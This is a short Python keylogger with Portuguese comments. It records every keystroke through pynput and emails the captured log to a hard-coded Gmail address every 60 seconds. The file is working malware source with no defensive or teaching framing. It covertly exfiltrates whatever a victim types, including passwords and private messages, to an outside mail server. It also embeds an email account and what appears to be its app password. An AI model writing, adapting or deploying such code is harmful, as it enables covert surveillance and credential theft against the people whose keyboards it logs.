from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# Configurações do email
EMAIL_ORIGEM = "ekkoracker@gmail.com"
EMAIL_DESTINO = "ekkoracker@gmail.com"
SENHA_EMAIL = "jshk axef zzda fekn"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'dados capturados pelo keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
    try:
            
         server = smtplib.SMTP('smtp.gmail.com', 587) 
         server.starttls()
         server.login(EMAIL_ORIGEM, SENHA_EMAIL)
         server.send_message(msg)
         server.quit()
    except Exception as e:
                print("Erro ao enviar email",e)
    log = ""   
    
# Agendar o próximo envio em 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
       log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass
            

# inicia o keylogger e o envio automático de emails

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()

